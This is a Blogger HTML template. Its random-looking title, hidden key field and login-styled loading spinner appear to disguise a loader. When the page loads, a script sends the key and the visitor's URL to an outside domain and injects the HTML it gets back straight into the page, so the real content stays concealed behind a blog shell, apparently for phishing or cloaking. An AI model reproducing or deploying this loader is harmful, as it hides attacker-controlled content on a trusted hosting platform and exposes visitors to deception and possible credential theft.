  <b:skin>

  </b:skin>

<body>
  <header>
    <b:section class='header' id='header' maxwidgets='1' showaddelement='yes'>
      <b:widget id='Header1' locked='false' title='MdR5B6Hb1S (Tiêu đề)' type='Header' version='1'>
        <b:widget-settings>
          <b:widget-setting name='displayUrl' />
          <b:widget-setting name='displayHeight'>0</b:widget-setting>
          <b:widget-setting name='sectionWidth'>-1</b:widget-setting>
          <b:widget-setting name='useImage'>false</b:widget-setting>
          <b:widget-setting name='shrinkToFit'>false</b:widget-setting>
          <b:widget-setting name='imagePlacement'>BEHIND</b:widget-setting>
          <b:widget-setting name='displayWidth'>0</b:widget-setting>
        </b:widget-settings>
        <b:includable id='main'>
          <b:if cond='data:useImage'>
            <b:if cond='data:imagePlacement == &quot;BEHIND&quot;'>
              <b:if cond='data:mobile'>
                <div id='header-inner'>
                  <div class='titlewrapper' style='background: transparent'>
                    <h1 class='title' style='background: transparent; border-width: 0px'>
                      <b:include name='title' />
                    </h1>
                  </div>
                  <b:include name='description' />
                </div>
                <b:else />
                <div
                  expr:style='&quot;background-image: url(\&quot;&quot; + data:sourceUrl + &quot;\&quot;); &quot;+ &quot;background-position: &quot;+ data:backgroundPositionStyleStr + &quot;; &quot;+ data:widthStyleStr+ &quot;min-height: &quot; + data:height+ &quot;_height: &quot; + data:height+ &quot;background-repeat: no-repeat; &quot;'
                  id='header-inner'>
                  <div class='titlewrapper' style='background: transparent'>
                    <h1 class='title' style='background: transparent; border-width: 0px'>
                      <b:include name='title' />
                    </h1>
                  </div>
                  <b:include name='description' />
                </div>
              </b:if>
              <b:else />
              <div id='header-inner'>
                <a expr:href='data:blog.homepageUrl' style='display: block'>
                  <img expr:alt='data:title' expr:height='data:height'
                    expr:id='data:widget.instanceId + &quot;_headerimg&quot;' expr:src='data:sourceUrl'
                    expr:width='data:width' style='display: block' />
                </a>
                <b:if cond='data:imagePlacement == &quot;BEFORE_DESCRIPTION&quot;'>
                  <b:include name='description' />
                </b:if>
              </div>
            </b:if>
            <b:else />
            <div id='header-inner'>
              <div class='titlewrapper'>
                <h1 class='title'>
                  <b:include name='title' />
                </h1>
              </div>
              <b:include name='description' />
            </div>
          </b:if>
        </b:includable>
        <b:includable id='description'>
          <div class='descriptionwrapper'>
            <p class='description'><span>
                <data:description /></span></p>
          </div>
        </b:includable>
        <b:includable id='title'>
          <b:tag cond='data:blog.url != data:blog.homepageUrl' expr:href='data:blog.homepageUrl' name='a'>
            <data:title />
          </b:tag>
        </b:includable>
      </b:widget>
    </b:section>
  </header>
  <main id="html_main">
    <input id='is_smart_key' type='hidden' value='NjgxN3wyODR8ODA2OQ' /><br />
    <center><img alt='Image' style='height:auto; width:100%' src='https://1.bp.blogspot.com/-54-LLgWRoEg/YLPFKIoz1XI/AAAAAAAAAA4/ndgpArQiz8Ai5-5KrWmumRcuV9OJXpiRACLcBGAsYHQ/s432/hjkjhkhjk.PNG' /></center>
    <div class='modal backdrop fade' id='myModal_Loading' role='dialog'><br /><br /><br />
      <section class='login-form-wrap'>
        <div class="d-flex justify-content-center">
          <div class="spinner-grow text-primary" role="status">
            <span class="sr-only">Loading...</span>
          </div>
          <div class="spinner-grow text-danger" role="status">
            <span class="sr-only">Loading...</span>
          </div>
          <div class="spinner-grow text-warning" role="status">
            <span class="sr-only">Loading...</span>
          </div>
        </div>
      </section>
    </div>
  </main>
  <footer />
</body>
<script src="//code.jquery.com/jquery-3.3.1.slim.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
<script src="//stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
<script>
  $('#myModal_Loading').modal('show');
  function hideModal() {
    $("#myModal").removeClass("in");
    $(".modal-backdrop").remove();
    $("#myModal").hide();
  }
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://via.7uq.org/?key=' + document.getElementById("is_smart_key").value + '&amp;url=' + window.location);
  xhr.onload = function () {
    if (xhr.status === 200) {
      document.getElementById("html_main").innerHTML = xhr.responseText;
      hideModal();
    }
  };
  xhr.send();
</script>
